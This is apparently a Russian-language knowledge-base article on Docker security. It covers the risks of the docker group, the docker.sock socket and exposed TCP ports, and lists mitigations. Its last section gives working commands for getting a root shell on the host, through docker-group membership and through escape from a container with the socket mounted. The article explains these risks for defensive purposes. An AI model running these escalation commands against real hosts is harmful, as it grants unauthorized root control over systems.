# Безопасность Docker: Обзор угроз и векторов атак

Демон Docker (`dockerd`) по умолчанию работает с правами `root`. Это создает фундаментальный риск: любой процесс, получивший доступ к управляющему API Docker, фактически получает полный `root`-доступ к хост-системе.

## Определения: Ключевые векторы угроз

1. **Членство в группе `docker`**:
    - **Назначение:** Позволяет пользователю выполнять команды `docker` без `sudo`.
    - **Риск:** Предоставляет пользователю неконтролируемый доступ к Docker API через сокет, что позволяет легко получить `root`-доступ к хосту.

2. **Прямой доступ к сокету `/var/run/docker.sock`**:
    - **Назначение:** `docker.sock` — это **[Unix-сокет](../../Networking/Concepts/socket_api.md#unix-сокеты-af_unix)** для локального взаимодействия с демоном Docker.
    - **Риск:** Монтирование этого сокета в контейнер (`-v /var/run/docker.sock:/var/run/docker.sock`) позволяет процессам внутри контейнера управлять демоном Docker на хосте. Это классический сценарий "побега из контейнера" (`container escape`).

## Базовые концепции: Анализ векторов атак

### 1. Docker Socket (`/var/run/docker.sock`)

По умолчанию сокет принадлежит пользователю `root` и группе `docker` с правами `660`. Любой пользователь или процесс с правом на запись в этот сокет получает полный контроль над демоном. Несмотря на риски, прямой доступ к сокету необходим для легитимных инструментов управления (Portainer) и CI/CD (GitLab Runner), что требует абсолютного доверия к их образам.

**Альтернативные подходы:**

- **Прокси для сокета:** Использование утилит вроде `docker-socket-proxy` для фильтрации опасных API-вызовов.
- **Сборка без демона:** Применение инструментов **[Kaniko](./../Dockerfile/dockerfile_kaniko.md)** или **[Buildah](./../alternative_runtimes_and_tools.md#buildah-гибкая-сборка-образов)**, которые не требуют доступа к демону.
- **Изолированный Docker-in-Docker (`dind`):** Запуск отдельного, непривилегированного демона Docker внутри контейнера.

### 2. Сетевой доступ по TCP

Демон Docker может быть настроен на прослушивание сетевых портов, что создает дополнительный вектор для удаленных атак.

- **Порт `2375` (HTTP):** Незашифрованный, предоставляет полный контроль над демоном.
- **Порт `2376` (HTTPS):** Защищенный, использует TLS для аутентификации и шифрования.

## Практические сценарии: Примеры атак

### Сценарий 1: Прямой доступ к сокету пользователем из группы `docker`

Пользователь, состоящий в группе `docker`, может выполнить следующую команду без `sudo` и получить `root`-шелл на хосте.

```sh
docker run -it --rm --privileged -v /:/host busybox:1.36.1 chroot /host
```

### Сценарий 2: Побег из контейнера с проброшенным сокетом

Если сокет смонтирован в контейнер, злоумышленник, получивший доступ к этому контейнеру, может выполнить следующие действия:

```sh
# 1. Находясь в контейнере, куда по ошибке смонтировали сокет,
#    злоумышленник устанавливает docker-cli.

# 2. С его помощью он запускает новый, привилегированный контейнер, 
#    монтируя в него корневую файловую систему хоста.
docker run -it --rm -v /:/host busybox chroot /host

# 3. Результат: получен root-шелл на хост-системе.
whoami # -> root
```
